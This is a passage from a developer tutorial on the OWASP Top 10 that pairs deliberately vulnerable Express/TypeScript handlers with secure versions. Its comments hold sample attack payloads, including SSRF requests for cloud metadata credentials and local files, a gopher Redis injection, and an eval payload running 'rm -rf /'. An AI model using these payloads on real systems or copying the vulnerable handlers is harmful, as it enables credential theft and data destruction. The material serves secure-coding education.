// 4. Accessed S3 buckets containing 100M+ customer records
// 5. $80M fine, massive reputation damage
```

### SSRF Attack Scenarios

```typescript
// ──────────────────────────────────────────────────────────────────────────
// SSRF ATTACK SCENARIOS
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: URL preview feature
app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    const response = await fetch(url);  // Fetches ANYTHING!
    const html = await response.text();
    res.json({ preview: extractMetadata(html) });
});

// ATTACK 1: AWS Metadata (Most Critical)
// { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role" }
// Result: Returns AWS access keys!

// ATTACK 2: Internal Services
// { "url": "http://internal-api:8080/admin/users" }
// Result: Access internal API without authentication

// ATTACK 3: Port Scanning
// { "url": "http://192.168.1.1:22" }
// { "url": "http://192.168.1.1:3306" }
// Result: Discover internal services

// ATTACK 4: Local Files (if file:// allowed)
// { "url": "file:///etc/passwd" }
// { "url": "file:///app/.env" }
// Result: Read local files

// ATTACK 5: Redis Command Injection (via gopher)
// { "url": "gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$5%0d%0ahello%0d%0a" }
// Result: Execute Redis commands

// ❌ VULNERABLE: Webhook feature
app.post('/api/webhooks', async (req, res) => {
    const { webhookUrl, event, data } = req.body;
    
    // Server sends data to user-provided URL
    await fetch(webhookUrl, {
        method: 'POST',
        body: JSON.stringify({ event, data })
    });
});

// ATTACK: Register webhook to internal URL
// { "webhookUrl": "http://169.254.169.254/...", "event": "order.created" }

// ❌ VULNERABLE: Image proxy
app.get('/api/image-proxy', async (req, res) => {
    const { imageUrl } = req.query;
    const response = await fetch(imageUrl);
    response.body.pipe(res);
});

// ATTACK: http://myapp.com/api/image-proxy?imageUrl=http://169.254.169.254/...
```

### SSRF Prevention

```typescript
// ──────────────────────────────────────────────────────────────────────────
// SSRF PREVENTION - COMPREHENSIVE SOLUTION
// ──────────────────────────────────────────────────────────────────────────

import { URL } from 'url';
import dns from 'dns/promises';
import net from 'net';

// Blocked protocols
const ALLOWED_PROTOCOLS = new Set(['http:', 'https:']);

// Blocked hostnames
const BLOCKED_HOSTS = new Set([
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '::1',
    '169.254.169.254',  // AWS/GCP/Azure metadata
    'metadata.google.internal',  // GCP
    '100.100.100.200',  // Alibaba Cloud
]);

// Blocked IP ranges (private/internal)
const BLOCKED_IP_RANGES = [
    /^127\./,                           // Loopback
    /^10\./,                            // Private Class A
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./,  // Private Class B
    /^192\.168\./,                      // Private Class C
    /^169\.254\./,                      // Link-local
    /^0\./,                             // Current network
    /^224\./,                           // Multicast
    /^240\./,                           // Reserved
    /^fc00:/,                           // IPv6 unique local
    /^fe80:/,                           // IPv6 link-local
    /^::1$/,                            // IPv6 loopback
];

// Allowed domains (for strict mode)
const ALLOWED_DOMAINS = new Set([
    'example.com',
    'api.trusted-partner.com',
    // ... whitelist of allowed domains
]);

interface SSRFValidationOptions {
    strictMode?: boolean;      // Only allow whitelisted domains
    allowRedirects?: boolean;  // Follow redirects
    maxRedirects?: number;
    timeout?: number;
}

async function validateURL(
    urlString: string, 
    options: SSRFValidationOptions = {}
): Promise<{ valid: boolean; error?: string; url?: URL }> {
    const { strictMode = false, allowRedirects = false } = options;
    
    try {
        // 1. Parse URL
        const url = new URL(urlString);
        
        // 2. Check protocol
        if (!ALLOWED_PROTOCOLS.has(url.protocol)) {
            return { valid: false, error: `Protocol not allowed: ${url.protocol}` };
        }
        
        // 3. Check hostname against blocklist
        const hostname = url.hostname.toLowerCase();
        if (BLOCKED_HOSTS.has(hostname)) {
            return { valid: false, error: 'Hostname blocked' };
        }
        
        // 4. Strict mode: only allow whitelisted domains
        if (strictMode) {
            const domain = hostname.split('.').slice(-2).join('.');
            if (!ALLOWED_DOMAINS.has(domain)) {
                return { valid: false, error: 'Domain not in allowlist' };
            }
        }
        
        // 5. Resolve DNS and check IP addresses
        try {
            const addresses = await dns.resolve4(hostname);
            
        for (const ip of addresses) {
            // Check against blocked IP ranges
            if (BLOCKED_IP_RANGES.some(range => range.test(ip))) {
                    return { valid: false, error: `Resolved IP ${ip} is blocked` };
                }
                
                // Additional check: Is IP private?
                if (net.isIP(ip) && isPrivateIP(ip)) {
                    return { valid: false, error: 'Resolved to private IP' };
                }
            }
        } catch (dnsError) {
            return { valid: false, error: 'DNS resolution failed' };
        }
        
        // 6. Check for DNS rebinding attacks
        // (Resolve again after a delay to catch rebinding)
        if (!strictMode) {
            await new Promise(resolve => setTimeout(resolve, 100));
            const addresses2 = await dns.resolve4(hostname);
            if (addresses2.some(ip => BLOCKED_IP_RANGES.some(range => range.test(ip)))) {
                return { valid: false, error: 'DNS rebinding detected' };
            }
        }
        
        return { valid: true, url };
        
    } catch (error) {
        return { valid: false, error: 'Invalid URL format' };
    }
}

function isPrivateIP(ip: string): boolean {
    return BLOCKED_IP_RANGES.some(range => range.test(ip));
}

// Safe fetch with SSRF protection
async function safeFetch(
    urlString: string, 
    options: RequestInit & SSRFValidationOptions = {}
): Promise<Response> {
    // Validate URL
    const validation = await validateURL(urlString, options);
    if (!validation.valid) {
        throw new Error(`SSRF Protection: ${validation.error}`);
    }
    
    // Fetch with additional protections
    const response = await fetch(urlString, {
        ...options,
        redirect: options.allowRedirects ? 'follow' : 'error',
        signal: AbortSignal.timeout(options.timeout || 10000),
        headers: {
            ...options.headers,
            'User-Agent': 'MyApp-Fetcher/1.0'
        }
    });
    
    // Validate redirect destination (if following redirects)
    if (options.allowRedirects && response.redirected) {
        const redirectValidation = await validateURL(response.url, options);
        if (!redirectValidation.valid) {
            throw new Error(`SSRF Protection: Redirect to blocked URL`);
        }
    }
    
    return response;
}

// ✅ SECURE: URL preview with SSRF protection
app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    
    try {
        const response = await safeFetch(url, {
            timeout: 5000,
            allowRedirects: true,
            maxRedirects: 3
        });
        
        // Validate content-type
    const contentType = response.headers.get('content-type');
    if (!contentType?.includes('text/html')) {
            return res.status(400).json({ error: 'URL must return HTML' });
        }
        
        // Limit response size
        const maxSize = 1024 * 1024;  // 1MB
        const contentLength = parseInt(response.headers.get('content-length') || '0');
        if (contentLength > maxSize) {
            return res.status(400).json({ error: 'Response too large' });
    }
    
    const html = await response.text();
        const metadata = extractMetadata(html.slice(0, maxSize));
        
        res.json({ preview: metadata });
        
    } catch (error) {
        if (error.message.startsWith('SSRF Protection:')) {
            logger.warn('SSRF attempt blocked', { url, error: error.message });
            return res.status(400).json({ error: 'URL not allowed' });
        }
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});

// AWS-specific: Use IMDSv2 (requires session token)
// Configure EC2 to require IMDSv2:
// aws ec2 modify-instance-metadata-options \
//   --instance-id i-1234567890abcdef0 \
//   --http-tokens required \
//   --http-endpoint enabled
```

---

## A06: Vulnerable and Outdated Components

```typescript
// ════════════════════════════════════════════════════════════════════════════
// VULNERABLE COMPONENTS - SUPPLY CHAIN SECURITY
// ════════════════════════════════════════════════════════════════════════════

/*
WHY THIS MATTERS:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  Average Node.js project: 1000+ transitive dependencies                   │
│  Average vulnerability: 60+ days to discover                              │
│  Log4j (Log4Shell): Affected millions of applications                     │
│                                                                             │
│  FAMOUS INCIDENTS:                                                         │
│  • Log4j (2021): RCE affecting most Java applications                     │
│  • ua-parser-js (2021): Cryptocurrency miner injected                     │
│  • event-stream (2018): Bitcoin wallet theft code                         │
│  • colors/faker (2022): Maintainer sabotaged packages                     │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// ──────────────────────────────────────────────────────────────────────────
// AUTOMATED VULNERABILITY SCANNING
// ──────────────────────────────────────────────────────────────────────────

// package.json scripts
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:ci": "npm audit --audit-level=high",
    "snyk": "snyk test",
    "snyk:monitor": "snyk monitor"
  }
}

// GitHub Actions workflow for security scanning
// .github/workflows/security.yml
const securityWorkflow = `
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * *'  # Daily at midnight

jobs:
  npm-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
  
  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
  
  codeql:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4
      
      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: javascript, typescript
      
      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
  
  dependency-review:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v4
      
      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate
`;

// ──────────────────────────────────────────────────────────────────────────
// LOCK FILE INTEGRITY
// ──────────────────────────────────────────────────────────────────────────

// Always commit lock files
// package-lock.json (npm) or yarn.lock (yarn) or pnpm-lock.yaml (pnpm)

// CI should use frozen lockfile
// npm ci (NOT npm install)
// yarn --frozen-lockfile
// pnpm install --frozen-lockfile

// Subresource Integrity (SRI) for CDN scripts
// <script src="https://cdn.example.com/lib.js" 
//         integrity="sha384-ABC123..." 
//         crossorigin="anonymous"></script>
```

---

## A09: Security Logging and Monitoring Failures

```typescript
// ════════════════════════════════════════════════════════════════════════════
// SECURITY LOGGING - DETECTION AND RESPONSE
// ════════════════════════════════════════════════════════════════════════════

/*
WHAT TO LOG (Security Events):
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  AUTHENTICATION EVENTS                                                     │
│  ├── Successful logins (with IP, user agent)                              │
│  ├── Failed logins (potential brute force)                                │
│  ├── Password changes                                                      │
│  ├── MFA enrollment/verification                                          │
│  └── Session creation/destruction                                          │
│                                                                             │
│  AUTHORIZATION EVENTS                                                      │
│  ├── Access denied (403)                                                  │
│  ├── Resource access attempts                                             │
│  ├── Privilege escalation attempts                                        │
│  └── Admin actions                                                         │
│                                                                             │
│  DATA ACCESS EVENTS                                                        │
│  ├── Sensitive data access (PII, financial)                              │
│  ├── Bulk data exports                                                    │
│  ├── API rate limit hits                                                  │
│  └── Unusual data access patterns                                         │
│                                                                             │
│  SECURITY EVENTS                                                           │
│  ├── Input validation failures                                            │
│  ├── CSRF/XSS/SQLi attempts detected                                     │
│  ├── File upload attempts                                                 │
│  └── Configuration changes                                                │
│                                                                             │
│  WHAT NOT TO LOG:                                                          │
│  ├── Passwords (even hashed)                                              │
│  ├── API keys, tokens, secrets                                            │
│  ├── Full credit card numbers                                             │
│  └── Session tokens                                                        │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

import winston from 'winston';
import { v4 as uuidv4 } from 'uuid';

// Security-focused logger configuration
const securityLogger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    defaultMeta: {
        service: 'myapp',
        environment: process.env.NODE_ENV
    },
    transports: [
        // Security events to separate file
        new winston.transports.File({
            filename: 'logs/security.log',
            level: 'warn'
        }),
        // All events to SIEM (e.g., Datadog, Splunk)
        // new DatadogTransport({ ... }),
    ]
});

// Structured security event logging
interface SecurityEvent {
    eventType: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    userId?: string;
    ip: string;
    userAgent?: string;
    resource?: string;
    action?: string;
    outcome: 'success' | 'failure' | 'blocked';
    details?: Record<string, any>;
    timestamp: Date;
    requestId: string;
}

function logSecurityEvent(event: Omit<SecurityEvent, 'timestamp' | 'requestId'>, req: Request) {
    const fullEvent: SecurityEvent = {
        ...event,
        timestamp: new Date(),
        requestId: req.headers['x-request-id'] as string || uuidv4(),
        ip: req.ip || req.connection.remoteAddress || 'unknown',
        userAgent: req.headers['user-agent']
    };
    
    // Log based on severity
    if (event.severity === 'critical' || event.severity === 'high') {
        securityLogger.error('Security Event', fullEvent);
    } else if (event.severity === 'medium') {
        securityLogger.warn('Security Event', fullEvent);
    } else {
        securityLogger.info('Security Event', fullEvent);
    }
    
    // Critical events: alert immediately
    if (event.severity === 'critical') {
        sendSecurityAlert(fullEvent);
    }
}

// Authentication logging middleware
function authenticationLogger(req: Request, res: Response, next: NextFunction) {
    const originalEnd = res.end;
    
    res.end = function(...args) {
        // Log authentication attempts
        if (req.path === '/api/login') {
            logSecurityEvent({
                eventType: 'authentication',
                severity: res.statusCode === 200 ? 'low' : 'medium',
                userId: req.body?.email,
                ip: req.ip,
                action: 'login',
                outcome: res.statusCode === 200 ? 'success' : 'failure',
                details: {
                    statusCode: res.statusCode,
                    failureReason: res.statusCode !== 200 ? 'invalid_credentials' : undefined
                }
            }, req);
        }
        
        return originalEnd.apply(res, args);
    };
    
    next();
}

// Authorization failure logging
function logAuthorizationFailure(req: Request, resource: string, requiredPermission: string) {
    logSecurityEvent({
        eventType: 'authorization',
        severity: 'medium',
        userId: req.user?.id,
        ip: req.ip,
        resource,
        action: requiredPermission,
        outcome: 'failure',
        details: {
            userRole: req.user?.role,
            path: req.path,
            method: req.method
        }
    }, req);
}

// Suspicious activity detection
class SuspiciousActivityDetector {
    private failedLogins = new Map<string, { count: number; firstAttempt: Date }>();
    private accessPatterns = new Map<string, Set<string>>();
    
    recordFailedLogin(ip: string, email: string) {
        const key = `${ip}:${email}`;
        const current = this.failedLogins.get(key) || { count: 0, firstAttempt: new Date() };
        current.count++;
        this.failedLogins.set(key, current);
        
        // Check for brute force
        if (current.count >= 5) {
            const timeWindow = Date.now() - current.firstAttempt.getTime();
            if (timeWindow < 15 * 60 * 1000) {  // 15 minutes
                this.alertBruteForce(ip, email, current.count);
            }
        }
    }
    
    recordDataAccess(userId: string, resourceType: string, resourceId: string) {
        const key = `${userId}:${resourceType}`;
        let resources = this.accessPatterns.get(key);
        if (!resources) {
            resources = new Set();
            this.accessPatterns.set(key, resources);
        }
        resources.add(resourceId);
        
        // Check for bulk access (potential data scraping)
        if (resources.size > 100) {
            this.alertBulkAccess(userId, resourceType, resources.size);
        }
    }
    
    private alertBruteForce(ip: string, email: string, attempts: number) {
        sendSecurityAlert({
            type: 'BRUTE_FORCE_DETECTED',
            severity: 'high',
            message: `${attempts} failed login attempts for ${email} from ${ip}`,
            recommendedAction: 'Consider blocking IP or implementing CAPTCHA'
        });
    }
    
    private alertBulkAccess(userId: string, resourceType: string, count: number) {
        sendSecurityAlert({
            type: 'BULK_ACCESS_DETECTED',
            severity: 'medium',
            message: `User ${userId} accessed ${count} ${resourceType} resources`,
            recommendedAction: 'Review for potential data scraping'
        });
    }
}

// Alert to security team
async function sendSecurityAlert(alert: any) {
    // PagerDuty integration
    await fetch('https://events.pagerduty.com/v2/enqueue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            routing_key: process.env.PAGERDUTY_ROUTING_KEY,
            event_action: 'trigger',
            payload: {
                summary: alert.message,
                severity: alert.severity,
                source: 'security-monitor',
                custom_details: alert
            }
        })
    });
    
    // Slack notification
    await fetch(process.env.SLACK_SECURITY_WEBHOOK!, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            text: `🚨 Security Alert: ${alert.type}`,
            attachments: [{
                color: alert.severity === 'critical' ? 'danger' : 'warning',
                fields: [
                    { title: 'Message', value: alert.message },
                    { title: 'Recommended Action', value: alert.recommendedAction }
                ]
            }]
        })
    });
}
```

---

## Part 4: Real-World Attack Scenarios

### Scenario 1: E-Commerce Price Manipulation

```typescript
// ════════════════════════════════════════════════════════════════════════════
// REAL-WORLD SCENARIO 1: E-COMMERCE PRICE MANIPULATION
// ════════════════════════════════════════════════════════════════════════════

/*
ATTACK CHAIN:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. Attacker intercepts checkout request                                   │
│     POST /api/checkout                                                     │
│     Body: { productId: "laptop", quantity: 1, price: 999.99 }             │
│                                                                             │
│  2. Modifies price in request                                              │
│     Body: { productId: "laptop", quantity: 1, price: 0.01 }               │
│                                                                             │
│  3. Server trusts client-provided price                                    │
│     await chargeCard(req.body.price);  // $0.01 charged!                  │
│                                                                             │
│  IMPACT: $999.98 loss per order                                           │
│  ROOT CAUSE: A04 Insecure Design - trusting client data                   │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// ❌ VULNERABLE
app.post('/api/checkout', async (req, res) => {
    const { items } = req.body;
    
    let total = 0;
    for (const item of items) {
        total += item.price * item.quantity;  // Price from client!
    }
    
    await chargeCard(req.user.paymentMethod, total);
    await createOrder(items, total);
});

// ✅ SECURE
app.post('/api/checkout', async (req, res) => {
    const { items, couponCode } = req.body;
    
    // Validate and calculate server-side
    let total = 0;
    const orderItems = [];
    
    for (const item of items) {
        // Get real price from database
        const product = await db.products.findById(item.productId);
        if (!product || !product.available) {
            return res.status(400).json({ error: `Product ${item.productId} unavailable` });
        }
        
        // Validate quantity
        if (item.quantity < 1 || item.quantity > product.maxQuantity) {
            return res.status(400).json({ error: 'Invalid quantity' });
        }
        
        // Check stock
        if (item.quantity > product.stock) {
            return res.status(400).json({ error: 'Insufficient stock' });
        }
        
        const itemTotal = product.price * item.quantity;
        total += itemTotal;
        
        orderItems.push({
            productId: product.id,
            name: product.name,
            unitPrice: product.price,  // From database
            quantity: item.quantity,
            total: itemTotal
        });
    }
    
    // Apply coupon server-side
    if (couponCode) {
        const discount = await validateAndApplyCoupon(couponCode, req.user.id, total);
        total -= discount;
    }
    
    // Never negative
    total = Math.max(0, total);
    
    // Idempotency check
    const existingOrder = await db.orders.findByIdempotencyKey(req.headers['idempotency-key']);
    if (existingOrder) {
        return res.json(existingOrder);
    }
    
    // Process payment
    const payment = await chargeCard(req.user.paymentMethod, total);
    
    // Create order
    const order = await db.orders.create({
        userId: req.user.id,
        items: orderItems,
        total,
        paymentId: payment.id,
        idempotencyKey: req.headers['idempotency-key']
    });
    
    res.json(order);
});
```

### Scenario 2: Mass Account Takeover

```typescript
// ════════════════════════════════════════════════════════════════════════════
// REAL-WORLD SCENARIO 2: MASS ACCOUNT TAKEOVER VIA PASSWORD RESET
// ════════════════════════════════════════════════════════════════════════════

/*
ATTACK CHAIN:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  VULNERABILITIES CHAINED:                                                  │
│  1. No rate limiting on password reset (A04 Insecure Design)              │
│  2. Predictable reset tokens (A02 Cryptographic Failures)                 │
│  3. Token in URL logged by proxies (A02 Cryptographic Failures)           │
│  4. No email confirmation (A04 Insecure Design)                           │
│                                                                             │
│  ATTACK:                                                                   │
│  1. Attacker requests password reset for target@company.com               │
│  2. Token is: base64(email + timestamp)                                   │
│  3. Attacker calculates: base64("target@company.com" + timestamp)         │
│  4. Resets password, gains access                                         │
│  5. Repeats for all known emails                                          │
│                                                                             │
│  IMPACT: Mass account compromise                                           │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// ❌ VULNERABLE: Everything wrong
app.post('/api/forgot-password', async (req, res) => {
    const { email } = req.body;
    const user = await db.users.findByEmail(email);
    
    if (user) {  // ❌ Reveals if email exists
        // ❌ Predictable token
        const token = Buffer.from(`${email}:${Date.now()}`).toString('base64');
        
        // ❌ Token in URL (logged, cached, Referer header)
        const resetUrl = `https://myapp.com/reset?token=${token}&email=${email}`;
        
        // ❌ No rate limiting
        await sendEmail(email, `Reset password: ${resetUrl}`);
    }
    
    res.json({ success: true });
});

// ❌ VULNERABLE: Token validation
app.post('/api/reset-password', async (req, res) => {
    const { token, email, newPassword } = req.query;  // ❌ From query string!
    
    // ❌ No token expiry check
    // ❌ No token invalidation after use
    // ❌ No password strength validation
    
    await db.users.update({ where: { email }, data: { password: newPassword } });
    res.json({ success: true });
});

// ✅ SECURE: Complete password reset flow
import crypto from 'crypto';
import rateLimit from 'express-rate-limit';

const resetLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,  // 1 hour
    max: 3,  // 3 attempts per hour per IP
    message: { error: 'Too many attempts, try again later' }
});

app.post('/api/forgot-password', resetLimiter, async (req, res) => {
    const { email } = req.body;
    
    // Always return same response (don't reveal if email exists)
    res.json({ message: 'If the email exists, a reset link has been sent' });
    
    // Process asynchronously to not leak timing information
    setImmediate(async () => {
        const user = await db.users.findByEmail(email.toLowerCase());
        if (!user) return;
        
        // Rate limit per email too
        const recentAttempts = await db.passwordResets.count({
            where: {
                userId: user.id,
                createdAt: { gt: new Date(Date.now() - 60 * 60 * 1000) }
            }
        });
        if (recentAttempts >= 3) return;
        
        // Cryptographically random token
        const token = crypto.randomBytes(32).toString('hex');
        const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
        
        // Store hash, not token
        await db.passwordResets.create({
            data: {
                userId: user.id,
                tokenHash,
                expiresAt: new Date(Date.now() + 60 * 60 * 1000)  // 1 hour
            }
        });
        
        // Token NOT in URL - sent to email, used in POST body
        await sendEmail(email, `
            Your password reset code is: ${token}
            
            This code expires in 1 hour.
            If you didn't request this, ignore this email.
        `);
        
        // Log for security monitoring
        logSecurityEvent({
            eventType: 'password_reset_requested',
            severity: 'low',
            userId: user.id,
            outcome: 'success'
        });
    });
});

app.post('/api/reset-password', async (req, res) => {
    const { token, newPassword } = req.body;  // ✅ POST body
    
    // Validate password strength
    const passwordErrors = validatePasswordStrength(newPassword);
    if (passwordErrors.length > 0) {
        return res.status(400).json({ error: 'Weak password', details: passwordErrors });
    }
    
    // Check if breached
    if (await checkHaveIBeenPwned(newPassword)) {
        return res.status(400).json({ error: 'Password found in data breach' });
    }
    
    // Hash token for lookup
    const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
    
    // Find valid reset request
    const resetRequest = await db.passwordResets.findFirst({
        where: {
            tokenHash,
            expiresAt: { gt: new Date() },
            usedAt: null
        },
        include: { user: true }
    });
    
    if (!resetRequest) {
        return res.status(400).json({ error: 'Invalid or expired token' });
    }
    
    // Hash new password
    const passwordHash = await hashPassword(newPassword);
    
    // Update in transaction
    await db.$transaction([
        // Update password
        db.users.update({
            where: { id: resetRequest.userId },
            data: { passwordHash }
        }),
        
        // Mark token as used
        db.passwordResets.update({
            where: { id: resetRequest.id },
            data: { usedAt: new Date() }
        }),
        
        // Invalidate all sessions
        db.sessions.deleteMany({
            where: { userId: resetRequest.userId }
        })
    ]);
    
    // Notify user
    await sendEmail(resetRequest.user.email, 
        'Your password has been reset. If this wasn\'t you, contact support immediately.'
    );
    
    // Log
    logSecurityEvent({
        eventType: 'password_reset_completed',
        severity: 'medium',
        userId: resetRequest.userId,
        outcome: 'success'
    });
    
    res.json({ success: true });
});
```

---

*Part 4 Complete. Continue to Part 5 for Common Mistakes and Anti-Patterns.*

# OWASP Top 10 - Part 5: Common Mistakes, Anti-Patterns & When NOT To

## Common Security Mistakes Developers Make

### Mistake 1: Security Through Obscurity

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 1: SECURITY THROUGH OBSCURITY
// ════════════════════════════════════════════════════════════════════════════

// ❌ "Hidden" admin endpoint
app.get('/api/super-secret-admin-panel-do-not-access', (req, res) => {
    // No auth check - "it's hidden"
    const users = await db.users.findMany({ include: { password: true } });
    res.json(users);
});

// ❌ "Obfuscated" API key in frontend
const apiKey = atob('c3VwZXItc2VjcmV0LWtleQ==');  // base64 is NOT encryption!

// ❌ Custom "encryption"
function encrypt(text) {
    return text.split('').map(c => String.fromCharCode(c.charCodeAt(0) + 1)).join('');
}

// WHY THIS FAILS:
// - Automated scanners find "hidden" endpoints
// - Source code gets leaked/decompiled
// - Attackers reverse-engineer obfuscation in minutes
// - Base64/ROT13 are encoding, not encryption

// ✅ CORRECT: Proper authentication and authorization
app.get('/api/admin/users', 
    authenticate,           // Verify identity
    requireRole('admin'),   // Verify permission
    async (req, res) => {
        const users = await db.users.findMany({
            select: { id: true, email: true, role: true }  // Never passwords!
        });
        res.json(users);
    }
);
```

### Mistake 2: Client-Side Only Validation

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 2: CLIENT-SIDE ONLY VALIDATION
// ════════════════════════════════════════════════════════════════════════════

// ❌ Frontend "protection"
function AdminPanel() {
    if (user.role !== 'admin') {
        return <div>Access Denied</div>;
    }
    return <AdminDashboard />;
}

// ❌ Backend trusts frontend
app.delete('/api/users/:id', async (req, res) => {
    // "Frontend only shows this button to admins"
    await db.users.delete({ where: { id: req.params.id } });
    res.json({ success: true });
});

// ATTACK:
// curl -X DELETE https://api.example.com/api/users/1
// Result: Anyone can delete any user!

// WHY THIS FAILS:
// - Anyone can call APIs directly (curl, Postman, scripts)
// - Browser dev tools can bypass frontend checks
// - Frontend code is visible to attackers

// ✅ CORRECT: Validate on BOTH client AND server
// Client: For UX (immediate feedback)
// Server: For SECURITY (enforced)

app.delete('/api/users/:id',
    authenticate,
    requireRole('admin'),
    async (req, res) => {
        // Additional checks
        if (req.params.id === req.user.id) {
            return res.status(400).json({ error: 'Cannot delete yourself' });
        }
        
        await db.users.delete({ where: { id: req.params.id } });
        res.json({ success: true });
    }
);
```

### Mistake 3: Logging Sensitive Data

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 3: LOGGING SENSITIVE DATA
// ════════════════════════════════════════════════════════════════════════════

// ❌ Logging everything
app.use((req, res, next) => {
    console.log('Request:', JSON.stringify(req.body));
    // Logs: { email: "user@example.com", password: "secretpassword123" }
    next();
});

// ❌ Logging tokens
function authenticate(req, res, next) {
    const token = req.headers.authorization;
    console.log('Auth attempt with token:', token);  // Token in logs!
    // ...
}

// ❌ Error logging with sensitive context
app.use((err, req, res, next) => {
    console.error('Error:', err, 'Request:', req);  // Full request in logs!
});

// WHY THIS FAILS:
// - Log files are less protected than databases
// - Logs often sent to third-party services
// - Log aggregation exposes to more people
// - Compliance violations (GDPR, PCI-DSS)

// ✅ CORRECT: Redact sensitive fields
const SENSITIVE_FIELDS = [
    'password', 'token', 'authorization', 'cookie', 
    'ssn', 'creditCard', 'cvv', 'secret', 'apiKey'
];

function redactSensitive(obj: any, depth = 0): any {
    if (depth > 10 || !obj || typeof obj !== 'object') return obj;
    
    const result: any = Array.isArray(obj) ? [] : {};
    
    for (const [key, value] of Object.entries(obj)) {
        const keyLower = key.toLowerCase();
        const isSensitive = SENSITIVE_FIELDS.some(f => keyLower.includes(f.toLowerCase()));
        
        if (isSensitive) {
            result[key] = '[REDACTED]';
        } else if (typeof value === 'object') {
            result[key] = redactSensitive(value, depth + 1);
        } else if (typeof value === 'string' && value.length > 100) {
            result[key] = value.substring(0, 50) + '...[truncated]';
        } else {
            result[key] = value;
        }
    }
    
    return result;
}

// Safe logging middleware
app.use((req, res, next) => {
    logger.info('Request', {
        method: req.method,
        path: req.path,
        query: redactSensitive(req.query),
        body: redactSensitive(req.body),
        userId: req.user?.id
        // Never log: headers.authorization, cookies
    });
    next();
});
```

### Mistake 4: Hardcoded Secrets

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 4: HARDCODED SECRETS
// ════════════════════════════════════════════════════════════════════════════

// ❌ Secrets in code
const JWT_SECRET = 'super_secret_key_change_in_production';
const DB_PASSWORD = 'admin123';
const STRIPE_KEY = 'sk_live_abc123...';

// ❌ Secrets in git (even if later removed)
// .env committed to git
// STRIPE_SECRET=sk_live_...

// WHY THIS FAILS:
// - Git history is permanent (even after deletion)
// - Code reviews expose secrets
// - Deployments to wrong environment
// - Third-party tools scan for exposed secrets (GitGuardian)

// ✅ CORRECT: Environment variables + secrets manager

// 1. Environment variables (basic)
const JWT_SECRET = process.env.JWT_SECRET;

// 2. Secrets manager (production)
import { SecretsManager } from '@aws-sdk/client-secrets-manager';

const secretsManager = new SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName: string): Promise<string> {
    const response = await secretsManager.getSecretValue({ SecretId: secretName });
    return response.SecretString!;
}

// Load secrets at startup
async function loadSecrets() {
    const secrets = JSON.parse(await getSecret('myapp/production'));
    return {
        jwtSecret: secrets.JWT_SECRET,
        dbPassword: secrets.DB_PASSWORD,
        stripeKey: secrets.STRIPE_KEY
    };
}

// 3. Validation at startup
function validateEnvironment() {
    const required = ['JWT_SECRET', 'DATABASE_URL', 'SESSION_SECRET'];
    const missing = required.filter(key => !process.env[key]);
    
    if (missing.length > 0) {
        console.error('Missing required environment variables:', missing);
        process.exit(1);
    }
    
    // Validate secret strength
    if (process.env.JWT_SECRET!.length < 32) {
        console.error('JWT_SECRET must be at least 32 characters');
        process.exit(1);
    }
}

// .gitignore
// .env
// .env.local
// .env.*.local
// *.pem
// *.key
```

### Mistake 5: Using eval() and Dynamic Code Execution

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 5: EVAL AND DYNAMIC CODE EXECUTION
// ════════════════════════════════════════════════════════════════════════════

// ❌ eval() with user input
app.post('/api/calculate', (req, res) => {
    const { formula } = req.body;
    const result = eval(formula);  // CODE EXECUTION!
    res.json({ result });
});

// ATTACK:
// { "formula": "require('child_process').execSync('rm -rf /')" }
// Result: Server destroyed!

// ❌ new Function() with user input
const userCode = req.body.code;
const fn = new Function('x', userCode);
fn(10);  // Same problem as eval

// ❌ vm.runInNewContext with untrusted code
import vm from 'vm';
vm.runInNewContext(req.body.code);  // NOT secure sandbox!
